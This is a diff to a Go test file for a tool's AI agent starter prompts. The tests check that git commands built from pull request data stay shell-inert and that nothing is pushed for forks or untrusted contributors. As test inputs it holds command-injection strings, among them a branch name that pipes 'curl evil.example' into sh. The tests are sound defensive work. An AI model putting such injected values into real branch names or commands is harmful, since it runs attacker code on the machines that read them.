@@ -1,6 +1,8 @@
 package prompts
 
 import (
+	"crypto/sha256"
+	"encoding/hex"
 	"flag"
 	"os"
 	"path/filepath"
@@ -13,6 +15,7 @@ import (
 
 	"github.com/mrz1836/nilbox/internal/agent"
 	"github.com/mrz1836/nilbox/internal/item"
+	"github.com/mrz1836/nilbox/internal/textutil"
 )
 
 // update makes TestStarterGoldens rewrite its golden files from the current output
@@ -286,11 +289,29 @@ func dependencyData() Data {
 	}
 }
 
+// hostileBranch is a head branch git accepts (git check-ref-format --branch takes it) that
+// a shell left to read it would run as a command of its own.
+const hostileBranch = "x;$(curl${IFS}-s${IFS}evil.example|sh)"
+
+// forkData is prompt data for pull request 213 from a person's fork, opened from the fork's
+// main: an outside contributor's, as every fork's pull request is.
+func forkData() Data {
+	d := dependencyData()
+	d.Number, d.URL, d.Author, d.IsBot = 213, "https://github.com/acme-org/example-repo/pull/213", "octo-contributor", false
+	d.Branch, d.OutsideContributor = "main", true
+
+	return d
+}
+
 // TestFixDependencySecurityGoldens pins the dependency security starter's text in a
-// worktree at the pull request's head and in one left at an older commit. Rewrite them
-// with go test ./internal/prompts -run TestFixDependencySecurityGoldens -update.
+// worktree at the pull request's head, in one left at an older commit, with a head branch
+// a shell would run, and for a fork's pull request. Rewrite them with
+// go test ./internal/prompts -run TestFixDependencySecurityGoldens -update.
 func TestFixDependencySecurityGoldens(t *testing.T) {
 	t.Parallel()
+
+	hostile := dependencyData()
+	hostile.Branch = hostileBranch
 
 	tests := []struct {
 		name string
@@ -298,6 +319,8 @@ func TestFixDependencySecurityGoldens(t *testing.T) {
 	}{
 		{name: "fix dependency security at the head", data: dependencyData().WithSession(true, true)},
 		{name: "fix dependency security at an older commit", data: dependencyData().WithSession(true, false)},
+		{name: "fix dependency security with a hostile branch", data: hostile.WithSession(true, false)},
+		{name: "fix dependency security from a fork", data: forkData().WithSession(true, false)},
 	}
 
 	for _, tt := range tests {
@@ -332,9 +355,9 @@ func TestFixDependencySecurityWithoutValues(t *testing.T) {
 	out, err := tmpl.Execute(bare.WithSession(true, false))
 	require.NoError(t, err)
 	assert.Contains(t, out, "dependabot[bot] opened it, and its security checks failed.\n")
-	assert.Contains(t, out, "`git fetch origin dependabot/go_modules/golang.org/x/net-0.33.0`")
+	assert.Contains(t, out, "`git fetch origin refs/pull/212/head`")
 	assert.Contains(t, out, "`git checkout --detach FETCH_HEAD`")
-	assert.Contains(t, out, "`git push origin HEAD:dependabot/go_modules/golang.org/x/net-0.33.0`")
+	assert.Contains(t, out, "`git push origin HEAD:refs/heads/dependabot/go_modules/golang.org/x/net-0.33.0`")
 	assert.NotContains(t, out, "on commit")
 
 	out, err = tmpl.Execute(bare.WithSession(false, false))
@@ -347,6 +370,343 @@ func TestFixDependencySecurityWithoutValues(t *testing.T) {
 	assert.Contains(t, out, "these checks failed on commit 4f2a9c1e8b7d6a5f4e3d2c1b0a9f8e7d6c5b4a39: "+
 		"🔒 Security Scans / govulncheck, CodeQL / Analyze.\n")
 	assert.Contains(t, out, "This worktree is clean and at that commit.")
-	assert.Contains(t, out, "`git push upstream HEAD:dependabot/go_modules/golang.org/x/net-0.33.0`. Never force-push.")
+	assert.Contains(t, out,
+		"`git push upstream HEAD:refs/heads/dependabot/go_modules/golang.org/x/net-0.33.0`. Never force-push.")
 	assert.NotContains(t, out, "--force")
+
+	unknown := dependencyData()
+	unknown.Branch = ""
+
+	out, err = tmpl.Execute(unknown.WithSession(true, true))
+	require.NoError(t, err)
+	assert.Contains(t, out, "commit with a conventional message, but push nothing: the pull request's head branch "+
+		"isn't known yet.")
+	assert.NotContains(t, out, "git push", "without the branch's name there is nothing to push to")
+}
+
+// TestFixDependencySecurityQuotesTheBranch renders the starter for head branches a shell
+// would read as more than one word, or run, and checks that its commands stay inert: the
+// fetch names the pull request by its number alone, and the push names the branch as one
+// literal word, the full ref of the pull request's own head.
+func TestFixDependencySecurityQuotesTheBranch(t *testing.T) {
+	t.Parallel()
+
+	tmpl := starterTemplate(t, StarterFixDependencySecurity)
+
+	for _, branch := range []string{
+		hostileBranch,
+		"fix the widget",
+		"it's-fixed",
+		`say-"hello"`,
+		"$(touch pwned)",
+		"`touch pwned`",
+		"a&&b||c>d<e",
+		"~/x*?[y]{z,w}#!^",
+		"heads/main",
+		"--force",
+		"=cmd",
+		"café",
+	} {
+		t.Run(branch, func(t *testing.T) {
+			t.Parallel()
+
+			data := dependencyData()
+			data.Branch = branch
+
+			for _, session := range []Data{data.WithSession(true, true), data.WithSession(true, false), data} {
+				out, err := tmpl.Render(session)
+				require.NoError(t, err)
+
+				push := command(t, out, "git push ", "`. Never force-push.")
+				assert.Equal(t, []string{"git", "push", "upstream", "HEAD:refs/heads/" + branch}, shellWords(t, push),
+					"the branch reaches the push as one literal word: %s", push)
+				assert.Equal(t, "git push upstream HEAD:refs/heads/"+textutil.ShellWord(branch), push)
+
+				if session.InWorktree && !session.WorktreeOnPRHead {
+					fetch := command(t, out, "git fetch ", "`, then")
+					assert.Equal(t, []string{"git", "fetch", "upstream", "refs/pull/212/head"}, shellWords(t, fetch))
+				}
+			}
+		})
+	}
+}
+
+// TestFixDependencySecurityPushesOnlyItsOwnBranch checks the starter pushes nothing for a
+// fork's pull request, or another outside contributor's: their branch isn't in the
+// repository the clone's remote names, so a push there under the branch's name could land
+// on another branch altogether, such as the repository's own main.
+func TestFixDependencySecurityPushesOnlyItsOwnBranch(t *testing.T) {
+	t.Parallel()
+
+	tmpl := starterTemplate(t, StarterFixDependencySecurity)
+
+	sameRepo := dependencyData()
+	sameRepo.Branch = "main"
+
+	untrustedBot := dependencyData()
+	untrustedBot.OutsideContributor = true
+
+	tests := []struct {
+		name string
+		data Data
+	}{
+		{name: "a fork's pull request from its main", data: forkData()},
+		{name: "a bot the user doesn't trust", data: untrustedBot},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			for _, session := range []Data{tt.data.WithSession(true, true), tt.data.WithSession(true, false), tt.data} {
+				out, err := tmpl.Render(session)
+				require.NoError(t, err)
+				assert.NotContains(t, out, "git push")
+				assert.Contains(t, out, "commit with a conventional message, but push nothing: this pull request comes "+
+					"from a fork or from outside the repository's members and collaborators")
+				assert.Contains(t, out, "This pull request comes from an outside contributor.", "the notice still ends it")
+			}
+		})
+	}
+
+	out, err := tmpl.Render(sameRepo.WithSession(true, true))
+	require.NoError(t, err)
+	assert.Contains(t, out, "`git push upstream HEAD:refs/heads/main`",
+		"a branch in the repository itself is pushed to by its full ref, whatever its name")
+}
+
+// command returns the command in out that starts with prefix, up to the text that
+// follows it.
+func command(t *testing.T, out, prefix, after string) string {
+	t.Helper()
+
+	_, rest, found := strings.Cut(out, "`"+prefix)
+	require.True(t, found, "no `%s… in:\n%s", prefix, out)
+
+	cmd, _, found := strings.Cut(rest, after)
+	require.True(t, found, "no %q after `%s…", after, prefix)
+
+	return prefix + cmd
+}
+
+// shellWords splits a command into its words as a POSIX shell reads them, for the
+// commands the starters write: plain words, text in single quotes, and a character after a
+// backslash. Outside quotes it takes only the characters every shell reads as themselves
+// (textutil.ShellSafe's), and fails on any other, an expansion, a substitution, an
+// operator, a glob, or a quote left open among them.
+func shellWords(t *testing.T, command string) []string {
+	t.Helper()
+
+	var r wordReader
+
+	for i := 0; i < len(command); i++ {
+		c := command[i]
+
+		switch {
+		case r.quoted:
+			r.inQuotes(c)
+		case c == '\'':
+			r.quoted, r.inWord = true, true
+		case c == '\\' && i+1 < len(command):
+			i++
+			r.add(command[i])
+		case c == ' ':
+			r.end()
+		case textutil.ShellSafe("a" + string(c)):
+			r.add(c)
+		default:
+			require.Failf(t, "a shell reads more than words", "%q: outside quotes at %q", command, command[i:])
+		}
+	}
+
+	require.False(t, r.quoted, "%q leaves a quote open", command)
+	r.end()
+
+	return r.words
+}
+
+// wordReader holds what shellWords has read: the words so far, and the word it is in.
+type wordReader struct {
+	words  []string
+	word   strings.Builder
+	inWord bool
+	quoted bool
+}
+
+// add adds c to the word being read.
+func (r *wordReader) add(c byte) {
+	r.word.WriteByte(c)
+	r.inWord = true
+}
+
+// inQuotes reads c inside single quotes, where only a single quote, which ends them, is
+// special.
+func (r *wordReader) inQuotes(c byte) {
+	if c == '\'' {
+		r.quoted = false
+
+		return
+	}
+
+	r.add(c)
+}
+
+// end ends the word being read, if any.
+func (r *wordReader) end() {
+	if !r.inWord {
+		return
+	}
+
+	r.words = append(r.words, r.word.String())
+	r.word.Reset()
+	r.inWord = false
+}
+
+// hostileData is the sample data for kind with every text a repository, a pull request's
+// author, a clone's own config, or the user chose set to text a shell would run. The
+// repository's owner and name, which GitHub keeps to letters, digits, and -_., and the
+// head commit, hex, stay as they are: those, and the number, are the values a starter may
+// put into a command as they are.
+func hostileData(kind item.Kind) Data {
+	const evil = `x;$(curl${IFS}-s${IFS}evil.example|sh) 'q' "d" ~ * # & | < >`
+
+	d := Sample(kind)
+	for _, field := range []*string{
+		&d.Title, &d.Author, &d.Labels, &d.DefaultBranch, &d.Remote, &d.Branch, &d.FailedChecks, &d.SensitiveFiles,
+		&d.Dependency, &d.FromVersion, &d.ToVersion, &d.Profile, &d.Me,
+	} {
+		*field = evil
+	}
+
+	return d
+}
+
+// TestStarterCommandsAreInert fills in every starter prompt, in every session and trust it
+// can launch in, with hostile values, and reads each command it gives (each span in
+// backticks) as a shell would: every one must be plain words, so no value someone else
+// chose can run. A starter that puts such a value into a command must pass it through
+// shellquote. The <run-id> a starter asks the agent to fill in is no value of the item's.
+func TestStarterCommandsAreInert(t *testing.T) {
+	t.Parallel()
+
+	for _, st := range Starters() {
+		if st.purpose() == PurposeReply {
+			continue
+		}
+
+		t.Run(st.Key, func(t *testing.T) {
+			t.Parallel()
+
+			tmpl := starterTemplate(t, st.Key)
+
+			for _, data := range hostileLaunches(st.AppliesTo) {
+				out, err := tmpl.Render(data)
+				require.NoError(t, err)
+
+				spans := strings.Split(out, "`")
+				require.Equal(t, 1, len(spans)%2, "every command is closed:\n%s", out)
+
+				for i := 1; i < len(spans); i += 2 {
+					shellWords(t, strings.ReplaceAll(spans[i], "<run-id>", "RUN-ID"))
+				}
+			}
+		})
+	}
+}
+
+// hostileLaunches returns hostileData for every kind appliesTo covers, from a member and
+// from an outside contributor, in the clone, in a worktree left at an older commit, and in
+// one at the pull request's head.
+func hostileLaunches(appliesTo AppliesTo) []Data {
+	var out []Data
+
+	for _, kind := range item.Kinds() {
+		if !appliesTo.Covers(kind) {
+			continue
+		}
+
+		for _, outside := range []bool{false, true} {
+			data := hostileData(kind)
+			data.OutsideContributor = outside
+			out = append(out, data, data.WithSession(true, false), data.WithSession(true, true))
+		}
+	}
+
+	return out
+}
+
+// TestEarlierStarterTextsAreAsShipped pins each starter's earlier texts to what the builds
+// that shipped them had, byte for byte, by their SHA-256: a copy is brought up to date only
+// while it holds exactly one of them, so a changed byte would leave every such copy behind.
+// Each must also differ from the starter's text now.
+func TestEarlierStarterTextsAreAsShipped(t *testing.T) {
+	t.Parallel()
+
+	shipped := map[string][]string{
+		// The first text, from the build that added the starter.
+		StarterFixDependencySecurity: {"dedd6bd89c91000fe065776b76e828d1acc2587eb9d55c624435b1a4fc9b700d"},
+	}
+
+	got := map[string][]string{}
+
+	for _, st := range Starters() {
+		for _, body := range st.Earlier {
+			assert.NotEqual(t, st.Body, body, st.Key)
+
+			sum := sha256.Sum256([]byte(body))
+			got[st.Key] = append(got[st.Key], hex.EncodeToString(sum[:]))
+		}
+	}
+
+	assert.Equal(t, shipped, got)
+}
+
+func TestStarterOutdated(t *testing.T) {
+	t.Parallel()
+
+	st, ok := starterFor(StarterFixDependencySecurity)
+	require.True(t, ok)
+
+	copyOf := func(edit func(*Prompt)) Prompt {
+		p := Prompt{
+			Name: st.Name, Nickname: st.Nickname, AppliesTo: st.AppliesTo, Body: fixDependencySecurityBodyV1,
+			Purpose: PurposeAgent, Models: map[agent.ID]string{}, ExtraArgs: map[agent.ID][]string{},
+			StarterKey: st.Key,
+		}
+		if edit != nil {
+			edit(&p)
+		}
+
+		return p
+	}
+
+	tests := []struct {
+		name string
+		p    Prompt
+		want bool
+	}{
+		{name: "the earlier text, unchanged", p: copyOf(nil), want: true},
+		{name: "renamed, which changes nothing of the starter", p: copyOf(func(p *Prompt) { p.Nickname = "Dep sec" }), want: true},
+		{name: "already up to date", p: copyOf(func(p *Prompt) { p.Body = st.Body })},
+		{name: "the earlier text, edited", p: copyOf(func(p *Prompt) { p.Body += "Be brief.\n" })},
+		{name: "a setting changed", p: copyOf(func(p *Prompt) { p.Effort = "high" })},
+		{name: "another title", p: copyOf(func(p *Prompt) { p.Name = "My security fixer" })},
+		{name: "the user's own", p: copyOf(func(p *Prompt) { p.StarterKey = "" })},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			got, changed := upToDate(tt.p)
+			assert.Equal(t, tt.want, changed)
+
+			if tt.want {
+				assert.Equal(t, st.Body, got.Body)
+				assert.Equal(t, tt.p.Nickname, got.Nickname)
+			} else {
+				assert.Equal(t, tt.p, got)
+			}
+		})
+	}
 }
